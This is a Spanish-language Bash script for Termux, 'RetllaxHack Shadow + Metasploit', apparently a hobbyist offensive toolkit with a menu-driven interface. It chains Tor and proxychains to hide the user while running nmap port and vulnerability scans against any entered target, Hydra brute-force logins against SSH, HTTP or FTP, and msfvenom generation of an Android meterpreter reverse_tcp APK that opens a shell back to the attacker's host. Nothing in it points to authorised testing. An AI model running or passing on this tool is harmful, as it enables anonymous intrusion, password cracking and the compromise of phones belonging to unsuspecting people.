#!/usr/bin/env bash

# RetllaxHack Shadow + Metasploit (v9.0.1) - Termux (No Root)
# By Retllax - Escaneo global con Tor y Metasploit integrado

# ===== CONFIGURACIÓN RGB (Icono de RetllaxHack) =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER RETLLAXHACK =====
function show_banner {
  clear
  echo
  rgb " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
  rgb "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
  rgb "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝ "
  rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
  rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
  rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
  rgb "               SHADOW EDITION + METASPLOIT v9.0.1"
  echo
  rgb "=== ESCANEO GLOBAL | FUERZA BRITA | EXPLOITS (NO ROOT) ==="
  echo
}

# ===== VERIFICAR DEPENDENCIAS =====
function check_deps {
  if ! command -v tor >/dev/null || ! command -v proxychains >/dev/null; then
    rgb "[~] Instalando Tor y Proxychains..."
    pkg install tor proxychains-ng -y
    tor &
  fi

  if ! command -v nmap >/dev/null; then
    rgb "[~] Instalando Nmap..."
    pkg install nmap -y
  fi

  if ! command -v hydra >/dev/null; then
    rgb "[~] Instalando Hydra..."
    pkg install hydra -y
  fi

  if ! command -v msfconsole >/dev/null; then
    rgb "[~] Instalando Metasploit (1GB+ de espacio)..."
    pkg install unstable-repo metasploit -y
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
  fi
}

# ===== ESCANEO GLOBAL (Con Tor) =====
function global_scan {
  read -p "$(rgb "[?] IP/Dominio a escanear (ej: google.com): ")" target
  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports

  rgb "[~] Escaneando $target (Tor + Proxychains)..."
  proxychains -q nmap -Pn -sS -T4 --open -p $ports $target -oN retllax_scan.log

  rgb "[~] Buscando vulnerabilidades (CVE)..."
  proxychains -q nmap -Pn --script vuln -p $(grep "open" retllax_scan.log | awk -F'/' '{print $1}' | tr '\n' ',') $target >> retllax_vulns.log 2>&1

  rgb "[✔] Resultados:"
  grep --color "open" retllax_scan.log
  grep --color -E "VULNERABLE|CVE-" retllax_vulns.log
}

# ===== HYDRA SHADOW (Fuerza Bruta) =====
function hydra_attack {
  read -p "$(rgb "[?] IP/Dominio: ")" target
  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist

  rgb "[~] Detectando servicios..."
  service=$(proxychains -q nmap -p- --open $target | grep "open" | head -n 1 | awk '{print $3}')

  case $service in
    ssh) port=22 ;;
    http|http-proxy) port=80 ;;
    ftp) port=21 ;;
    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
  esac

  rgb "[~] Atacando $service ($target:$port)..."
  proxychains -q hydra -l $user -P $wordlist -t 6 -s $port $target $service -o retllax_hydra.log

  rgb "[+] Resultados:"
  grep --color "login:" retllax_hydra.log
}

# ===== METASPLOIT (No Root) =====
function metasploit_mod {
  if ! pgrep postgres >/dev/null; then
    rgb "[~] Iniciando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
    sleep 5
  fi

  rgb "[!] Módulos RetllaxHack:"
  rgb "1) Generar Payload Android"
  rgb "2) Buscar Exploits"
  rgb "3) Escanear Red (Auxiliar)"
  echo
  read -p "$(rgb "[?] Opción: ")" opt

  case $opt in
    1)
      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
      read -p "$(rgb "[?] LPORT (4444): ")" lport
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o retllax_payload.apk
      rgb "[✔] Payload: retllax_payload.apk"
      ;;
    2)
      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
      msfconsole -q -x "search $query; exit"
      ;;
    3)
      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit"
      ;;
    *) rgb "[!] Opción inválida";;
  esac
}

# ===== MENÚ RETLLAXHACK =====
function main_menu {
  check_deps
  while true; do
    show_banner
    rgb "1) Escaneo Global (Tor)"
    rgb "2) Ataque Hydra Shadow"
    rgb "3) Módulo Metasploit"
    rgb "4) Ver Logs"
    rgb "5) Salir"
    echo
    read -p "$(rgb "[?] Elige una opción: ")" opt

    case $opt in
      1) global_scan ;;
      2) hydra_attack ;;
      3) metasploit_mod ;;
      4)
        [ -f "retllax_scan.log" ] && cat retllax_scan.log | grep --color "open"
        [ -f "retllax_vulns.log" ] && cat retllax_vulns.log | grep --color -E "VULNERABLE|CVE-"
        [ -f "retllax_hydra.log" ] && cat retllax_hydra.log | grep --color "login:"
        ;;
      5)
        pkill -f tor
        rgb "[!] Saliendo de RetllaxHack..."
        exit 0
        ;;
      *)
        rgb "[!] Opción no válida"
        sleep 1
        ;;
    esac
    read -p "$(rgb "[?] Presiona Enter para continuar...")"
  done
}

# ===== INICIO =====
show_banner
main_menu
